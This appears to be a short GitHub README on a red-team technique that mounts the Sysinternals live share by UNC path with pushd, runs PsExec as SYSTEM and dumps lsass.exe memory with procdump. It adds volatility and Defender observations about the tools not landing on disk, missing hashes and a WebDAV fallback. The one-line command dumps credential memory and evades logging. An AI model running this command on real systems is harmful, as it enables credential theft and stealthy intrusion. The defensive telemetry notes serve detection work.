# pushdTTPIdea

Messing aroung with a TTP idea I had during a red team engagement:  

pushd \\live.sysinternals.com\tools && psexec -s -i -d procdump.exe -accepteula -ma lsass.exe test.txt  

    • Creating a temporary share by UNC path
    • Invoke PsExec -s to gain SYSTEM (psexec does not live on my device)
    • Run further TTP (in this example, just a basic Lsass dump with procdump on src host but of course this can be RCE)


    ![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/bd13b77d-5d27-429a-a359-7dfec7abf8b4)
    
The Sysinternal binaries don't seem to exist on my disk but rather in memory  

In Pslist from volatility:  

![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/be317d68-30f5-4db9-9b26-9c5be70ef8d2)


PsExec does not seem to exist on my Disk if I try to filescan from volatility.  

On Defender Side:

Comparision of psexec paths – Note missing hash:  

![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/a043b198-a2b1-4751-bb96-838c720b63bd)

Procs within the pushd not logged – Note path of “Y” was randomly chosen (by default its Z but I tried this twice):  
![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/f4f40c8e-70b3-41fb-a3a8-8e69fdbe7b4d)

![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/be7351f5-422f-4479-b658-4640dbb328c8)


On network Side:  

![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/195f9bcf-bec1-4945-bdb3-d92dbe4f74b2)

Looks like fallback to WebDav over Port 80 rather than SMB

Just to validate before SMB memes:

![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/0a786a2e-4bf1-4ba0-bb2c-349a5ab5aad3)
